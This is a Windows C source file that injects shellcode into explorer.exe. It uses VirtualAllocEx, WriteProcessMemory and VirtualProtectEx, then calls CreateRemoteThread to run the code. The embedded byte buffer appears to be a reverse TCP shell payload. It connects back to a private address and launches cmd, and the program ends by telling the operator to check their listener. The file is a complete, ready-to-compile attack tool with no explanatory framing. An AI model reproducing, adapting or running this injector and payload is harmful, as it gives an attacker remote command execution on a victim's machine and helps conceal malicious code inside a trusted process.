#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD GetProcessHandle(IN LPWSTR processName, OUT HANDLE hProcess, OUT DWORD* pID);

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x24\xe3\xc0\xa8\x00\x6f"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

BOOL GetProcessHandle(IN LPWSTR processName, OUT HANDLE* hProcess, OUT DWORD* pID)
{
 DWORD pid = 0;
 HANDLE hP = NULL;
 HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
 if (hSnapshot == INVALID_HANDLE_VALUE)
 {
  printf("[ERROR] Invalid HANDLE to process snapshots [%d]\n", GetLastError());
  return FALSE;
 }
 PROCESSENTRY32 pe;
 pe.dwSize = sizeof(pe);

 if (!Process32First(hSnapshot, &pe))
 {
  printf("[ERROR] Could not enumerate processes [%d]\n", GetLastError());
  return FALSE;
 }

 do {
  if (0 == _wcsicmp(processName, pe.szExeFile))
  {
   pid = pe.th32ProcessID;
   printf("[!] Trying to open handle on %ls, on pid %d\n", processName, pid);

   hP = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
   if (hP == NULL)
   {
    printf("[X] Could not open handle on %d, continuing\n", pid);
   }
   else
   {
    printf("[+] Successfully got handle on %d\n", pid);
    *pID = pid;
    *hProcess = hP;
    return TRUE;
   }
  }
 } while (Process32Next(hSnapshot, &pe));

 CloseHandle(hSnapshot);
}


int main()
{
 HANDLE hProcess = NULL;
 DWORD pID = 0;
 LPWSTR processName = L"explorer.exe";
 DWORD oldProtect = 0;
 if (GetProcessHandle(processName, &hProcess, &pID) == FALSE)
 {
  printf("[ERROR] Could not obtain handle [%d]\n", GetLastError());
  return 99;
 }
 printf("[+] The PID of %ls is %d\n", processName, pID);

 HANDLE pAddr = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 if (pAddr == NULL)
 {
  printf("[ERROR] Could not allocate remote memory [%d]\n", GetLastError());
  return 100;
 }
 printf("[+] Successfully allocated memory at %p\n", pAddr);
 if (WriteProcessMemory(hProcess, pAddr, buf, sizeof(buf), NULL) == 0)
 {
  printf("[ERROR] Could not write to remote memory [%d]\n", GetLastError());
  return 101;
 }
 printf("[+] Successfully written payload to memory\n");
 if (VirtualProtectEx(hProcess, pAddr, sizeof(buf), PAGE_EXECUTE_READ, &oldProtect) == 0)
 {
  printf("[ERROR] Could not change the memory protection [%d]\n", GetLastError());
  return 102;
 }
 printf("[+] Successfully changed the memory protection settings to PAGE_EXECUTE_READ\n");
 HANDLE hThread = CreateRemoteThread(hProcess, NULL, sizeof(buf), pAddr, NULL, NULL, NULL);
 if (hThread == NULL)
 {
  printf("[ERROR] Could not create new thread [%d]\n", GetLastError());
  return 102;
 }
 printf("[+] Successfully created a thread, check your listener!\n");
}